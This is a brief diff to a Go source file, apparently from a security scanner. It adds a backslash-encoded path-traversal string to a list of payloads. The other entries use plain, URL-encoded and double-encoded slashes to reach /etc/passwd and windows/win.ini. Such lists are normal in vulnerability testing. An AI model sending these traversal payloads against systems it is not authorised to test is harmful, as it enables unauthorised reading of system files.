@@ -54,6 +54,7 @@ var payloads = []string{
 	"..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2fetc/passwd",
 	"..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252fwindows/win.ini",
 	"../../../../../../../../../../../../../../windows/win.ini",
+	"..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5cwindows%5cwin.ini",
 }
 
 var (
